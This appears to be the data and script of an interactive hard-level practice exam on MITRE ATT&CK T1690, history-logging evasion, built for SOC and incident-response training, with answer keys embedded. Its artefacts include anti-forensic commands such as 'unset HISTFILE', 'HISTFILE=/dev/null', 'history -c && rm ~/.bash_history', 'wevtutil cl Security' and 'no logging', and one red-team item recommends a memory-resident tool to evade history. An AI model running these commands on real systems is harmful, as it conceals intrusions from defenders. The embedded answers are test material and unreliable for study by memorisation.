<script>window.__EXAM_DATA__ = {"meta":{"topicId":"t1690","techId":"T1690","objectLine":"T1690 — Prevent Command History Logging · MITRE ATT&CK Technique (Enterprise) · Tactic: Defense Impairment · Platforms: ESXi, Linux, Network Devices, Windows, macOS · Created 14 April 2026 (ATT&CK v20, version 1.0)","batch":3,"difficulty":"hard","examTitle":"T1690 — HARD practice exam","sevWord":"HARD","estimatedMinutes":45,"timerSec":2700,"passMark":70},"intro":{"learn":["By now you know what T1690 — Prevent Command History Logging is: an attacker stops a shell or a device from saving the commands they type, so the strongest local record of the intrusion never gets written. This exam runs at working-analyst pace. Every exercise gives you two to four realistic artefacts that must be read together, and every wrong option is a near miss that would be correct in a different case.","You will reason like the people who handle this technique daily. The SOC analyst must separate a hardening change window from a live intrusion that hides inside it. The incident responder must read a live process environment without destroying it. The detection engineer must tell HISTFILESIZE from HISTSIZE, and must know why absence-of-writes logic is weak alone but strong when correlated with active sessions. The red teamer must judge which quiet variant survives a hardened baseline.","The artefacts come from the same world as the ATT&CK page: bash variables, PSReadLine options, ESXi shells, Cisco-style device configs, and named procedure examples such as BPFDoor pointing MySQL history at /dev/null, The Gentlemen Ransomware (S9051) silencing output with /dev/null redirects, UNC3886 inhibiting logging through Junos process injection, and the ArcaneDoor campaign disabling logging on Cisco ASA appliances.","Expect traps. In one case the scary weekly rotation job is innocent and one quiet line in a profile is not. In another case the famous technique name is the wrong answer because the artefact shows a different log being cleared. The correct action is sometimes the least aggressive one. Read the artefacts first, decide what they prove, and only then look at the options."],"roles":["SOC analyst (tier 2/3)","Incident responder","Detection engineer","Threat hunter","Red team operator","CTI analyst","Control owner"],"keywords":[{"theme":"Discrimination skills","items":["T1690 — Prevent Command History Logging (never-saved)","T1070.003 — Clear Command History (already-saved, then removed)","T1562.002 — Disable Windows Event Logging (a different log family entirely)","HISTFILESIZE vs HISTSIZE — two size variables that are easy to swap"]},{"theme":"Live evidence handling","items":["/proc/<PID>/environ — readable while the process lives, gone after","Volatile-first ordering — capture before you kill, isolate or reboot","Absence of expected bash history writes — weak alone, strong with session correlation"]},{"theme":"Named procedure examples","items":["BPFDoor (S1161) — sets MYSQL_HISTFILE and HISTFILE to /dev/null","The Gentlemen Ransomware (S9051) — silences output with /dev/null redirects","UNC3886 (G1048) / RedPenguin (C0056) — inhibits logging via Junos process injection","VIRTUALPITA (S1217) — zeroes HISTFILE and stops vmsyslogd on ESXi","ArcaneDoor — disabled logging on targeted Cisco ASA appliances"]},{"theme":"Detection and mitigations under test","items":["DET0563 analytics AN1555–AN1559 and their platform focus","M1039 Environment Variable Permissions — lock the history variables","M1028 Operating System Configuration — keep HISTCONTROL on ignoredups","Coverage reasoning — which platforms still lack an analytic"]}],"how":["Pass mark: 70%, computed over the exercises you actually answer. Skipped-and-never-answered exercises are excluded from both the score and the maximum.","You have 16 exercises and 45 minutes. Most exercises chain two or three ideas across two to four artefacts.","Check stops the timer automatically (⏸ PAUSED — reviewing feedback); Next restarts it. Use the free reflection time to study the per-item breakdown.","Pause hides the exercise and stops the clock until you press Resume.","Multi-answer and placement exercises use partial credit: max(0, (H − W) / N). A wrong pick cancels a right one — guess selectively.","One hint per exercise costs 10% of that exercise's credit. Hard hints remove one wrong path, they never name the answer.","Skip parks exercises for later review while the timer runs; unanswered ones are excluded at submit.","The terminal exercise gives you the objective and the environment only — no syntax panel. Wrong flags cost credit; a command that would destroy evidence is marked as a dangerous near miss."]},"exercises":[{"id":"hard-01","type":"logview","title":"Correlate the jump host","scenario":{"summary":"lin-jump01 — auditd lines, a config diff and a quiet history file","arts":[{"label":"ARTEFACT 1 — context","mono":false,"body":"Jump host lin-jump01 allows engineers to reach production. The history file of the shared\nops account stopped growing on Tuesday morning. The three artefacts below are all you have\nso far. Use the filter box to search them before you conclude."}]},"question":"Select every conclusion that the artefacts actually support.","hint":"Only combine facts that two artefacts prove together. Watch out for the conclusion that sounds right but confuses prevention with deletion.","explain":"The auditd lines show HISTFILE being unset and HISTFILESIZE being zeroed while a session stayed active, and the history-file stat shows no new writes since 08:41 — so an active session with a dead history file is proven. Command telemetry gaps are a real observation. What is not proven is deletion: nothing shows the file being emptied, so calling it T1070.003 overstates the evidence. And no kernel patch claim follows from any line here.","study":"Prevention shows up as absence during activity; deletion shows up as a shrinking or missing file.","logview":{"filterLabel":"Filter:","logs":["08:41:02 auditd: syscall=execve pid=3107 user=ops cmd=\"unset HISTFILE\"","08:41:05 auditd: syscall=execve pid=3107 user=ops cmd=\"export HISTFILESIZE=0\"","08:41:09 auditd: pid=3107 tty=pts/2 session=active","08:44:37 auditd: syscall=connect pid=3107 dst=10[.]20[.]14[.]7:443","08:52:10 stat: /home/ops/.bash_history mtime=08:41:00 size=11842 (no growth)","09:03:55 edr: module command_telemetry state=degraded (since 08:40)","09:15:02 auditd: syscall=execve pid=3420 user=ops cmd=\"tail -n 200 /var/log/auth.log\""],"inner":{"type":"multi","opts":[{"t":"An active session ran with HISTFILE unset and HISTFILESIZE zeroed.","correct":true,"why":"Correct: auditd shows both commands, and the session line marks the shell active."},{"t":"The history file received no new writes while the session worked.","correct":true,"why":"Correct: the stat line shows mtime frozen at the moment the variables changed."},{"t":"Command telemetry degraded right after the tampering, which weakens visibility further.","correct":true,"why":"Correct: the EDR line shows the telemetry module degraded from 08:40."},{"t":"The attacker deleted the history file — this is Clear Command History, T1070.003.","correct":false,"why":"Wrong: nothing was deleted; the file simply stopped receiving lines. That is prevention (T1690)."},{"t":"The kernel of lin-jump01 was patched on Tuesday.","correct":false,"why":"Wrong: no artefact mentions kernel or patching at all."}]}}},{"id":"hard-02","type":"terminal","title":"Read the environment without killing it","scenario":{"summary":"app-web07 — PID 4471 must survive your evidence collection","arts":[{"label":"ARTEFACT 1 — IR handover note","mono":false,"body":"app-web07 runs a suspicious interactive bash as PID 4471, user deploy, started 40 minutes ago.\nThe shell's history file has not grown. We need proof of what environment it carries —\nespecially any HISTFILE or HISTCONTROL overrides — and the process must stay alive.\nYou are on a live production host: state changes are not acceptable."}]},"question":"Type a single read-only pipeline that prints PID 4471's environment with one variable per line.","hint":"The environment is a null-separated blob under /proc. Think about which reader converts null bytes to newlines.","explain":"cat /proc/4471/environ | tr '\\0' '\\n' reads the live environment and turns the null separators into newlines, one variable per line, without touching the process. Reading /proc/4471/cmdline instead would show only the command line, not the variables. kill would destroy the volatile evidence, and rm under /proc is meaningless and dangerous.","study":"Volatile evidence rule: read /proc first, never kill first.","terminal":{"prompt":"responder@app-web07","banner":["# live response shell — app-web07","# PID 4471 = suspect bash (user deploy)","# constraint: the process must remain running"],"solution":"cat /proc/4471/environ | tr '\\0' '\\n'","elements":[{"re":"/proc/4471/environ","label":"targets /proc/4471/environ","why":"That path is the live environment of the suspect process."},{"re":"^\\s*cat\\b","label":"reads it with a read-only tool (cat)","why":"cat only reads; the process and the host are unchanged."},{"re":"tr\\s+'?\\\\0'?\\s+'?\\\\n'?","label":"converts null bytes to newlines (tr '\\0' '\\n')","why":"The environment blob is null-separated; tr makes it readable."}],"dangerous":[{"re":"kill\\s+(-9\\s+)?4471","label":"kills PID 4471","why":"Killing the process destroys the very evidence you were sent to collect."},{"re":"rm\\s+.*proc","label":"delete under /proc","why":"Deleting under /proc is meaningless for evidence and can destabilise the host."}],"panel":null,"sampleOut":null,"output":["LANG=en_US.UTF-8","HOME=/home/deploy","HISTFILE=/dev/null","HISTCONTROL=ignorespace"]}},{"id":"hard-03","type":"branch","title":"Change window camouflage","scenario":{"summary":"jump-lin-02 — approved hardening, then forty space-prefixed commands","arts":[{"label":"ARTEFACT 1 — auditd excerpt, Monday morning","mono":true,"body":"09:02:11 user=ops-anna cmd=\"export HISTCONTROL=ignoreboth\"\n09:02:40 user=ops-anna cmd=\"  curl hxxp://mirror-cdn[.]example/pk.tar -o /tmp/pk.tar\"\n09:03-09:41 user=ops-anna: 39 further commands, all with a leading space"},{"label":"ARTEFACT 2 — change ticket CHG1042","mono":false,"body":"Approved hardening rollout, Monday 09:00-11:00, scope: baseline HISTCONTROL on jump hosts.\nOwner: platform team. Ops-anna is listed as implementer."},{"label":"ARTEFACT 3 — platform baseline doc","mono":true,"body":"# approved baseline\nexport HISTCONTROL=ignoredups   # NOT ignoreboth — see M1028 guidance"}]},"question":"Work the case in three steps: judge, confirm, act.","hint":"The ticket covers a config change, not forty downloads. The baseline says which value was approved.","explain":"The setting in the artefact is ignoreboth while the approved baseline is ignoredups — so the session deviated from the change it claims to implement. The forty space-prefixed commands, including a download from an unknown host, are only possible to hide because of that value: that is the camouflage, and the auditd command lines are the artefact that proves the trick. The proportionate action is preservation and escalation, not a reimage that destroys the evidence.","study":"A change window explains a change; it does not explain forty hidden commands.","branch":{"sim":false,"best":"Deviation from the approved baseline plus hidden commands equals camouflage; preserve auditd data and escalate to IR.","steps":[{"question":"Step 1 — Benign rollout or malicious camouflage?","opts":[{"t":"Malicious camouflage behind a real change window.","good":true,"why":"Correct: the implemented value deviates from the approved baseline and enables hiding.","outcome":"You treat the session as hostile but preserve everything."},{"t":"Fully benign rollout, close the case.","good":false,"why":"Wrong: it ignores the value deviation and the hidden commands.","outcome":"The intrusion continues with a hiding channel in place."},{"t":"Benign rollout plus a broken download script.","good":false,"why":"Wrong: thirty-nine hidden commands are not a script quirk.","outcome":"The download stays unexplained."}]},{"question":"Step 2 — Which single artefact best proves the hiding trick?","opts":[{"t":"The auditd command lines with their leading spaces.","good":true,"why":"Correct: they show commands that history will never store.","outcome":"The trick is demonstrated from primary telemetry."},{"t":"The change ticket.","good":false,"why":"Wrong: the ticket explains intent, not the trick.","outcome":"The case rests on paperwork, not behaviour."},{"t":"The platform baseline document.","good":false,"why":"Wrong: it shows what should be, not what happened.","outcome":"The proof remains circumstantial."}]},{"question":"Step 3 — What is the proportionate next action?","opts":[{"t":"Preserve auditd logs and escalate to IR with the value deviation highlighted.","good":true,"why":"Correct: preservation plus escalation fits the evidence and keeps options open.","outcome":"IR takes the case with full telemetry intact."},{"t":"Reimage jump-lin-02 immediately.","good":false,"why":"Wrong: reimage destroys the live evidence you just secured.","outcome":"The case loses its best artefacts."},{"t":"Reply to ops-anna asking her to stop using spaces.","good":false,"why":"Wrong: if the account is compromised, you just alert the intruder.","outcome":"The actor changes tools and hides deeper."}]}]}},{"id":"hard-04","type":"qcm","title":"Name the right technique","scenario":{"summary":"win-ad01 — a famous command, a tempting answer","arts":[{"label":"ARTEFACT 1 — EDR event on win-ad01","mono":true,"body":"host:  win-ad01 (domain controller)\nuser:  svc_replication (compromise suspected)\nrun:   wevtutil cl Security\nnote:  PowerShell history file untouched; no PSReadLine activity in 90 days"}]},"question":"Which technique does this artefact show?","hint":"Ask which log family was touched: shell history, or the Windows event log service?","explain":"wevtutil cl Security clears the Windows Security event log — that is T1070.001, Clear Windows Event Logs. T1690 is tempting because this file is about it, but the artefact shows no PSReadLine or history behaviour at all; T1070.003 would need shell history being cleared, and T1562.002 is about disabling the logging subsystem rather than clearing one log.","study":"Name the log family first: event log → T1070.001; shell history → T1070.003; prevent shell history → T1690.","qcm":{"correct":2,"opts":[{"t":"T1690 — Prevent Command History Logging.","why":"Wrong: no history mechanism is touched; PowerShell history was already dormant."},{"t":"T1070.003 — Clear Command History.","why":"Wrong: shell history was not cleared — the Security event log was."},{"t":"T1070.001 — Clear Windows Event Logs.","why":"Correct: wevtutil cl on the Security log is exactly that technique."},{"t":"T1562.002 — Disable Windows Event Logging.","why":"Wrong: the log was cleared once; the logging service was not disabled."}]}},{"id":"hard-05","type":"qcm","title":"Alarming and benign in one diff","scenario":{"summary":"Config review — the scary job and the quiet line","arts":[{"label":"ARTEFACT 1 — config diff, host lin-ci01","mono":true,"body":"+ 0 3 * * 0 root /usr/local/bin/rotate-history.sh   # weekly, logs to /var/log/history-rotation.log\n+ export HISTFILE=/dev/null                          # in /home/svc-deploy/.bash_profile\n- export HISTSIZE=5000                               # removed from same profile"},{"label":"ARTEFACT 2 — rotate-history.sh (audited, signed)","mono":true,"body":"#!/bin/sh\n# archives .bash_history weekly; approved change CHG-2211; signature valid\ntar -czf /var/log/archive/hist-$(date +%F).tgz /home/*/.bash_history"}]},"question":"Which finding matters most for T1690, and why?","hint":"One artefact is noisy but signed and archived; the other silently redirects a shell's history.","explain":"The rotation job looks scary but is signed, approved and archives history — it moves the record, it does not end it. The profile line export HISTFILE=/dev/null for svc-deploy ends the record for that account's future sessions: every command typed there becomes unrecordable. HISTSIZE removal only changes the in-memory limit and is a minor finding by comparison.","study":"Judge impact on the record, not how alarming the line looks.","qcm":{"correct":1,"opts":[{"t":"The weekly rotation cron — it touches every history file on the host.","why":"Wrong: it is signed, approved and archives the files; the record survives."},{"t":"HISTFILE=/dev/null for svc-deploy — the account's future commands become unrecordable.","why":"Correct: redirection to /dev/null ends that account's history record."},{"t":"The removal of HISTSIZE=5000 from the profile.","why":"Wrong: it changes the in-memory cap; the file still receives lines."},{"t":"Neither finding matters; both are routine.","why":"Wrong: the HISTFILE redirect is a textbook T1690 action."}]}},{"id":"hard-06","type":"drag","title":"Map behaviour to technique","scenario":{"summary":"Four techniques, five observed behaviours","arts":[{"label":"ARTEFACT 1 — case board","mono":false,"body":"The review board wants each behaviour on the correct technique card.\nCards: T1690 (prevent shell history), T1070.003 (clear shell history),\nT1562.002 (disable security logging/tools on Windows), T1036 (masquerade)."}]},"question":"Drag each behaviour onto the technique card it belongs to.","hint":"Never-saved vs removed; which log family; who is pretending to be whom.","explain":"Zeroing HISTFILESIZE and setting PSReadLine to SaveNothing prevent history from being written — T1690. history -c with rm of .bash_history removes what exists — T1070.003. Stopping the Windows event log service is T1562.002, a different log family. Renaming a tool to svchost.exe fakes identity — T1036 masquerading.","study":"Four cards, four ideas: prevent, clear, disable service, masquerade.","drag":{"zones":[{"id":"z-t1690","label":"T1690 — Prevent Command History Logging"},{"id":"z-t107003","label":"T1070.003 — Clear Command History"},{"id":"z-t1562002","label":"T1562.002 — Disable Windows Event Logging"},{"id":"z-t1036","label":"T1036 — Masquerading"}],"items":[{"t":"export HISTFILESIZE=0 in a live session","zone":"z-t1690","why":"A zero cap prevents future history lines — T1690."},{"t":"history -c && rm ~/.bash_history","zone":"z-t107003","why":"Clearing memory and deleting the file removes saved history — T1070.003."},{"t":"Set-PSReadLineOption -HistorySaveStyle SaveNothing","zone":"z-t1690","why":"SaveNothing stops PowerShell from saving future history — T1690 on Windows."},{"t":"Stop-Service eventlog on a workstation","zone":"z-t1562002","why":"Stopping the Windows event log service is the T1562.002 behaviour."},{"t":"Rename attacker tool to svchost.exe in System32","zone":"z-t1036","why":"Faking a legitimate binary name is masquerading — T1036."}]}},{"id":"hard-07","type":"branch","title":"The quiet perimeter device","scenario":{"summary":"asa-edge-01 — a config diff nobody filed","arts":[{"label":"ARTEFACT 1 — NDR config diff, 02:14","mono":true,"body":"- logging enable\n+ no logging\nsource-ip 10[.]30[.]8[.]44 (admin VPN), user vpn-admin-2"},{"label":"ARTEFACT 2 — traffic summary","mono":false,"body":"VPN session counts on asa-edge-01 unchanged overnight; management traffic continues."},{"label":"ARTEFACT 3 — vendor bulletin (excerpt)","mono":false,"body":"Campaign targeting perimeter ASA appliances has been observed disabling device logging\nas part of post-compromise activity."}]},"question":"Handle the perimeter case in three steps.","hint":"Activity continued while the record was switched off — that pairing is the signal.","explain":"'no logging' switches off device logging while VPN activity continues — the ATT&CK page names exactly this behaviour for network devices, and the vendor bulletin ties it to a known campaign pattern on this appliance class. The proportionate move is the least aggressive one: capture the running config read-only and escalate, because pushing config changes could destroy evidence and tip off the operator.","study":"Absence of new session logs while activity persists is the device-side fingerprint.","branch":{"sim":true,"best":"'no logging' disabled the device record during live activity; capture config read-only and escalate.","steps":[{"question":"Step 1 — What does the diff show?","opts":[{"t":"Device logging was disabled while activity continued.","good":true,"why":"Correct: no logging stops the record; the traffic summary shows the device stayed busy.","outcome":"You classify it as T1690 behaviour on a network device."},{"t":"A routine log-rotation task ran.","good":false,"why":"Wrong: rotation archives logs; it does not run 'no logging' in the config.","outcome":"The finding is filed as routine maintenance."},{"t":"The device lost power briefly.","good":false,"why":"Wrong: a reboot would not insert a config line.","outcome":"The timeline is misread."}]},{"question":"Step 2 — Best immediate action?","opts":[{"t":"Capture the running config read-only and escalate to IR and the network owner.","good":true,"why":"Correct: read-only capture preserves evidence and brings the owner in.","outcome":"The config is preserved; IR opens the case."},{"t":"Push 'logging enable' back immediately.","good":false,"why":"Wrong: writing to the device changes state and can erase what the diff proves.","outcome":"Evidence is altered; the operator is alerted."},{"t":"Reboot the ASA to clear the session table.","good":false,"why":"Wrong: rebooting destroys volatile state for no gain.","outcome":"Live sessions and tables are lost."}]},{"question":"Step 3 — Which detection concept applies?","opts":[{"t":"AN1559 — device CLI disabling logging plus missing new session logs.","good":true,"why":"Correct: the analytic pairs the CLI line with the anomalous log gap.","outcome":"The report cites the right analytic."},{"t":"AN1557 — PowerShell history suppression.","good":false,"why":"Wrong: no PowerShell is involved on an ASA.","outcome":"The report mixes platforms."},{"t":"AN1558 — ESXi shell HISTFILE tampering.","good":false,"why":"Wrong: this is a network device, not a hypervisor.","outcome":"Coverage mapping is wrong."}]}]}},{"id":"hard-08","type":"order","title":"Rank the four hosts","scenario":{"summary":"Four one-line summaries — put the most likely first","arts":[{"label":"ARTEFACT 1 — morning triage lines","mono":true,"body":"host-A  live root session; HISTFILE unset 3 minutes ago; unknown source IP\nhost-B  baseline shows HISTCONTROL=ignoreboth (build default since 2024)\nhost-C  svc_sql ran Set-PSReadLineOption -HistorySaveStyle SaveNothing yesterday, session followed\nhost-D  cron archives .bash_history weekly; signed script; ticket approved"}]},"question":"Order the hosts from most to least likely to be under active T1690 abuse.","hint":"Freshness plus a live session beats an old single event; a default value is not an event; a signed job is the weakest.","explain":"Host A is a live, fresh prevention action with an unknown source — first. Host C is a real technique action but a day old, so second. Host B only shows a weak default that enables the trick — no action observed, so third. Host D is an approved, signed archival job — least likely, and a reminder that scary-looking lines need ownership checks.","study":"Likelihood ranks observed fresh behaviour over enabling defaults over approved maintenance.","order":{"items":[{"t":"host-A — live root session, HISTFILE unset minutes ago","why":"Freshest, most direct evidence of active prevention."},{"t":"host-C — PSReadLine SaveNothing executed yesterday by a service account","why":"A real technique action, but a day old."},{"t":"host-B — ignoreboth present as build default","why":"Only an enabling default; no technique action observed."},{"t":"host-D — signed weekly history archive cron","why":"Approved maintenance that preserves the record."}]}},{"id":"hard-09","type":"match","title":"Who did what, exactly","scenario":{"summary":"Four procedure examples, four mechanisms","arts":[{"label":"ARTEFACT 1 — CTI board: mechanism cards","mono":false,"body":"Four entries from the ATT&CK procedure table, four different mechanisms:\na /dev/null pair for shell and MySQL, an output-silencing redirect,\na router process injection, and a hypervisor variable-plus-service combo."}]},"question":"Match each actor to the mechanism recorded for it.","hint":"MySQL pair, redirect silencing, Junos injection, ESXi vmsyslogd — one each.","explain":"BPFDoor (S1161) sets both MYSQL_HISTFILE and HISTFILE to /dev/null, so shell and MySQL stop recording. The Gentlemen Ransomware (S9051) silences output and errors with /dev/null redirects. UNC3886's RedPenguin malware injected into Junos OS processes to inhibit logging on routers. VIRTUALPITA zeroes HISTFILE and stops vmsyslogd on ESXi. Mechanism precision is what makes CTI reports actionable.","study":"Each mechanism implies its own telemetry: environ, redirects, router processes, hypervisor services.","match":{"pairs":[{"l":"BPFDoor (S1161)","r":"Sets MYSQL_HISTFILE and HISTFILE to /dev/null","why":"The backdoor points shell and MySQL history at the discard device."},{"l":"The Gentlemen Ransomware (S9051)","r":"Silences output and errors with /dev/null redirects","why":"Its commands discard output via /dev/null redirection."},{"l":"UNC3886 (RedPenguin, C0056)","r":"Injects into Junos OS processes to inhibit logging","why":"The malware inhibits router logging from inside Junos processes."},{"l":"VIRTUALPITA (S1217)","r":"Zeroes HISTFILE and stops vmsyslogd on ESXi","why":"The ESXi backdoor pairs the variable trick with stopping the logging service."}]}},{"id":"hard-10","type":"multi","title":"Conclusions you can defend","scenario":{"summary":"lin-app09 — three artefacts, five candidate conclusions","arts":[{"label":"ARTEFACT 1 — EDR alert","mono":true,"body":"host lin-app09 · user svc-etl · 01:12\ncmd=\"  ./collect.sh --full\"  (leading space)\ncmd=\"export HISTCONTROL=ignorespace\""},{"label":"ARTEFACT 2 — shell config of svc-etl","mono":true,"body":"HISTCONTROL=ignoreboth (unchanged since build)\nno other suppression lines"},{"label":"ARTEFACT 3 — syslog excerpt","mono":true,"body":"01:12-02:03 cron: etl jobs completed normally\n02:40 edr: process command logging enabled (baseline restore)"}]},"question":"Select every conclusion a senior analyst could defend in the review board.","hint":"Two conclusions rest on behaviour, one on the weakness of a single signal. The aggressive ones overreach.","explain":"The space-prefixed command after an ignorespace export shows the trick in use, and M1039 would have blocked the variable change at source — both defensible. The third defensible point is methodological: absence of history writes alone is weak evidence and must ride on command telemetry, which is exactly what the config shows was missing. Reimaging is an action, not a conclusion, and no Windows logs appear anywhere in the artefacts.","study":"Defensible = proven by an artefact or established method, not the loudest option.","multi":{"opts":[{"t":"The operator used the space-prefix trick after enabling ignorespace.","correct":true,"why":"Correct: the alert shows the enabling command followed by a space-prefixed run."},{"t":"An M1039-style control over environment variables would have blocked the change.","correct":true,"why":"Correct: locking HISTCONTROL for non-root users prevents exactly this export."},{"t":"Absence of history writes alone is weak; command telemetry had to carry the case.","correct":true,"why":"Correct: the telemetry gap makes the history signal insufficient by itself."},{"t":"lin-app09 must be reimaged immediately.","correct":false,"why":"Wrong: reimage is an aggressive action that would destroy live evidence — not a conclusion from these artefacts."},{"t":"Windows event logs on the host were cleared.","correct":false,"why":"Wrong: nothing in the artefacts touches Windows event logs; this is a Linux host story."}]}},{"id":"hard-11","type":"qcm","title":"Least aggressive wins","scenario":{"summary":"One signal, an active change window, an owner who answers","arts":[{"label":"ARTEFACT 1 — triage snapshot","mono":false,"body":"Single finding: admin account j.wei ran 'unset HISTFILE' on build-lin-03 ten minutes ago.\nChange window CHG-3355 is active right now; j.wei is the listed implementer.\nNo other anomalies on the host. j.wei answers the phone and confirms the change."}]},"question":"Which response is correct for this snapshot?","hint":"The evidence has one benign explanation that is checkable right now — and two actions that destroy evidence.","explain":"The finding has an owner, an active ticket and a live confirmation, so verifying the ticket and the account owner is both the least aggressive and the fastest correct action. Isolation, reimage or mass lockouts all destroy evidence or business capacity on the strength of one explained signal. If the confirmation had failed, the next step would change — that is what makes this a judgement call rather than a keyword match.","study":"Least aggressive correct action: verify the benign explanation while it is cheap to check.","qcm":{"correct":3,"opts":[{"t":"Isolate build-lin-03 from the network now.","why":"Wrong: disproportionate while a confirmed owner and active ticket explain the signal."},{"t":"Reimage build-lin-03 and reopen from a golden image.","why":"Wrong: destroys evidence for an explained change."},{"t":"Disable every admin account in the domain.","why":"Wrong: mass lockout punishes the whole estate for one signal."},{"t":"Verify CHG-3355 scope and j.wei's confirmation, then log the check.","why":"Correct: cheapest verification that resolves or escalates the finding."}]}},{"id":"hard-12","type":"qcm","title":"Find the coverage gap","scenario":{"summary":"Estate review — analytics deployed vs estate growth","arts":[{"label":"ARTEFACT 1 — coverage sheet","mono":true,"body":"Deployed analytics:\n  AN1555/AN1556  bash family (Linux servers)\n  AN1557         PowerShell (Windows fleet)\nNew this quarter:\n  ESXi hosts (12) · Cisco ASA perimeter (4 devices)\nQuestion from the CISO: are we covered for T1690 everywhere?"}]},"question":"Which statement answers the CISO correctly?","hint":"Count the platforms the estate now has against the analytics actually deployed.","explain":"The bash and Windows analytics are real, but ESXi and network devices arrived this quarter with no logic: AN1558 (ESXi shells) and AN1559 (device CLI) are missing, so those two platforms are the gap. Claiming full coverage, deploying more Windows logic, or replacing the bash analytics all misread the sheet.","study":"Coverage reasoning: list platforms, map analytics, name the missing pair.","qcm":{"correct":2,"opts":[{"t":"Coverage is complete; no action needed.","why":"Wrong: two new platforms have no analytic at all."},{"t":"Deploy AN1557 to the new platforms as well.","why":"Wrong: AN1557 is Windows PowerShell logic; it cannot cover ESXi or ASA."},{"t":"Deploy AN1558 for the ESXi hosts and AN1559 for the ASA estate.","why":"Correct: those are exactly the platform analytics still missing."},{"t":"Retire AN1555/1556 to fund the new platforms.","why":"Wrong: the bash analytics remain the biggest installed base's coverage."}]}},{"id":"hard-13","type":"fill","title":"Complete the SIEM query","scenario":{"summary":"Draft query for the history-tampering alert","arts":[{"label":"ARTEFACT 1 — query draft (gaps marked ____)","mono":true,"body":"index=edr process_cmdline=\"______\" OR process_cmdline=\"______\"\n| where session_state == \"______\"\n| raise t1690_suspicion"}]},"question":"Place the three missing pieces into the query.","hint":"One piece is the unset command, one is the zeroed size variable — and one near-miss variable looks almost right. The state must be the one that makes the alert strong.","explain":"The query needs 'unset HISTFILE' and 'HISTFILESIZE=0' as patterns, and the session state 'active' — because variables changed with no live session are background noise, while a live session with dead history is the evasion pattern. HISTSIZE=0 is the classic near miss: that variable governs the in-memory list and appears in the clearing technique's descriptions, not in this prevention query.","study":"HISTSIZE vs HISTFILESIZE: memory list vs saved file cap.","fill":{"text":"index=edr process_cmdline=\"{{0}}\" OR process_cmdline=\"{{1}}\" | where session_state == \"{{2}}\" | raise t1690_suspicion","slots":[{"correct":"unset HISTFILE","why":"The unset command is the primary prevention pattern."},{"correct":"HISTFILESIZE=0","why":"Zeroing the file cap is the second prevention pattern."},{"correct":"active","why":"Correlation with an active session is what makes the alert meaningful."}],"bank":["unset HISTFILE","HISTFILESIZE=0","active","HISTSIZE=0","closed"]}},{"id":"hard-14","type":"qcm","title":"Quiet variant on a hardened host","scenario":{"summary":"Authorised red team — the blue team hardened everything","arts":[{"label":"ARTEFACT 1 — engagement constraints (authorised test)","mono":false,"body":"Host bast-lin-05 in the exercise range is hardened:\n- environment variables locked for non-root (M1039-style control)\n- HISTCONTROL=ignoredups baseline (M1028)\n- your implant holds root in memory only; rules forbid file changes and evidence destruction."}]},"question":"Which variant keeps your session's commands out of history without breaking the rules?","hint":"Space tricks die against ignoredups, and the variables are locked. What kind of tool never creates an interactive shell history at all?","explain":"A memory-resident tool that takes commands over a socket and executes them without an interactive login shell never produces shell history in the first place — nothing to unset, nothing to prefix. The space trick fails because ignoredups still saves space-prefixed commands, the variables are locked by the control, and deleting the history file destroys evidence and breaks the rules.","study":"When the prevention levers are locked, change the execution model, not the variables.","qcm":{"correct":1,"opts":[{"t":"Prefix every command with a space to use ignorespace.","why":"Wrong: the baseline is ignoredups, which still saves space-prefixed commands."},{"t":"Run a memory-resident tool that executes commands without an interactive shell.","why":"Correct: no interactive shell means no shell history to write."},{"t":"unset HISTFILE at the start of each session.","why":"Wrong: the environment control blocks changing HISTFILE."},{"t":"Delete ~/.bash_history at the end of the session.","why":"Wrong: destruction of evidence is forbidden and it does not prevent future logging."}]}},{"id":"hard-15","type":"multi","title":"Absence-based detection, honestly","scenario":{"summary":"Two true statements about the missing-writes logic","arts":[{"label":"ARTEFACT 1 — design review question","mono":false,"body":"A junior engineer proposes alerting whenever ~/.bash_history receives no writes for one hour.\nThe reviewer asks: what is actually true about this signal? Select every true statement."}]},"question":"Select every true statement about absence-of-writes detection for T1690.","hint":"Absence is never proof by itself, and it is not a Windows mechanism. Correlation is what saves it.","explain":"Absence alone fires constantly on quiet hosts — that is its known weakness — and it has no Windows role, since PowerShell suppression is watched by the PSReadLine analytic. Its value appears when it is correlated with an active shell session, and it catches the space-prefix trick precisely because those commands can never appear in the file.","study":"Weak signal + right correlation = strong analytic. That is AN1555/1556's design.","multi":{"opts":[{"t":"Correlated with an active shell session, it becomes a strong evasion signal.","correct":true,"why":"Correct: session correlation is what removes the idle-host noise."},{"t":"It can catch space-prefixed commands that no history file will ever show.","correct":true,"why":"Correct: skipped commands keep the file silent, which is exactly what the signal notices."},{"t":"By itself, one hour without writes is proof of attacker activity.","correct":false,"why":"Wrong: idle hosts go an hour without writes all the time."},{"t":"It is the primary analytic for PowerShell suppression on Windows.","correct":false,"why":"Wrong: Windows suppression is covered by the PSReadLine analytic instead."}]}},{"id":"hard-16","type":"match","title":"Control to effect","scenario":{"summary":"Match each control decision to the effect it buys","arts":[{"label":"ARTEFACT 1 — hardening decision sheet","mono":false,"body":"Three decisions are on the table for the Linux baseline.\nEach one buys a different, specific effect. Match them."}]},"question":"Match each control decision to its effect.","hint":"One locks variables, one keeps space commands visible, one keeps duplicate-skipping without the hiding hole.","explain":"Locking the history variables for non-root users (M1039) blocks unset HISTFILE and friends at source. Setting HISTCONTROL=ignoredups instead of ignoreboth (M1028) removes the ignorespace hole while keeping duplicate-skipping. Restoring visibility means space-prefixed commands are recorded again — which is the whole point of abandoning ignoreboth.","study":"Every control has one measurable effect; name the effect, then the control.","match":{"pairs":[{"l":"M1039 — Environment Variable Permissions","r":"Users can no longer unset or zero the history variables","why":"M1039 blocks changes to HISTFILE, HISTFILESIZE and HISTCONTROL."},{"l":"M1028 — set HISTCONTROL=ignoredups","r":"Duplicate skipping stays, the leading-space hole closes","why":"ignoredups keeps only the duplicate behaviour; ignorespace disappears."},{"l":"Revert ignoreboth to ignoredups fleet-wide","r":"Space-prefixed commands are recorded again","why":"Without ignorespace, a leading space no longer hides anything."}]}}]};</script>
<script>

(function () {
  'use strict';
  var D = window.__EXAM_DATA__;
  var M = D.meta;

  /* ---------- helpers ---------- */
  function $(s, r) { return (r || document).querySelector(s); }
  function $$(s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); }
  function el(tag, cls, text) { var e = document.createElement(tag); if (cls) e.className = cls; if (text != null) e.textContent = text; return e; }
  function shuffled(a) { var x = a.slice(); for (var i = x.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = x[i]; x[i] = x[j]; x[j] = t; } return x; }
